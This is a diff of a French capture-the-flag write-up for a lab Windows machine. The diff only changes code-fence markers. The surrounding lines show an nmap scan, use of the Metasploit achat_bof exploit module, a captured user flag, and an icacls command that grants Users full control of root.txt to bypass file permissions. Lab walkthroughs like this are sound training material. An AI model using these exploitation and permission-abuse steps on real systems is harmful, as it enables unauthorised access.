@@ -10,7 +10,7 @@ Ce challenge a été quelque peu énervant (laborieux) à scanner en raison du l
 Chauffe Alfred !
 ----------------
 
-```plain
+```
 Nmap scan report for 10.10.10.74
 Host is up (0.024s latency).
 
@@ -24,7 +24,7 @@ PORT     STATE    SERVICE VERSION
 
 On trouve facilement un exploit pour *Achat* parmi les modules *Metasploit*. Il aura seulement fallut trouver le bon payload pour passer le firewall / antivirus :  
 
-```plain
+```
 msf exploit(windows/misc/achat_bof) > show options
 
 Module options (exploit/windows/misc/achat_bof):
@@ -120,7 +120,7 @@ The command completed successfully.
 
 Cet accès est bien sûr suffisant pour obtenir le flag de l'utilisateur :  
 
-```plain
+```
 C:\Users\Alfred\Desktop>type user.txt
 type user.txt
 72290246dfaedb1e3e3ac9d6fb306334
@@ -131,7 +131,7 @@ Windows permissions 101
 
 Ce qui est surprenant, c'est qu'avec le compte *Alfred* on puisse aller jusqu'au bureau de l'administrateur. On est cependant bloqué au moment de récupérer le contenu de *root.txt* :  
 
-```plain
+```
 c:\Users\Administrator\Desktop>dir
 dir
  Volume in drive C has no label.
@@ -158,7 +158,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 *Administrator* est le seul utilisateur à disposer de droits sur ce fichier, toutefois il s'avère qu'on dispose nous aussi du contrôle total (F) sur le dossier *Desktop* :  
 
-```plain
+```
 C:\Users\Administrator\Desktop>icacls .
 icacls .
 . NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
@@ -171,7 +171,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 On peut alors ajouter les permissions qui nous permettront de lire le fichier :  
 
-```plain
+```
 c:\Users\Administrator\Desktop>icacls root.txt /grant Users:F
 icacls root.txt /grant Users:F
 processed file: root.txt
